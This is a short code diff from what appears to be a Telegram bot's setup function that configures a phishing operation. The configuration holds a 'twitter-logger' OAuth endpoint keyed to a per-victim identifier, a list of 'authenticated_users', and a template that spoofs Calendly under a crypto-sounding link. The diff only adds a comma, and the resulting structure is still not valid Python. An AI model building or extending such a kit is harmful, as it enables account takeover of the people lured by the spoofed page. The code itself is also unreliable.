@@ -163,7 +163,7 @@ async def setup(update: Update, context: CallbackContext) -> None:
             "endpoint": f"https://twitter-logger.onrender.com/oauth?identifier={identifier}",
             "authenticated_users": [],
             "template": [
-                "temp": "Calendly"
+                "temp": "Calendly",
                 "spoof": "https://calendly.com/cointele"
             ]
         }
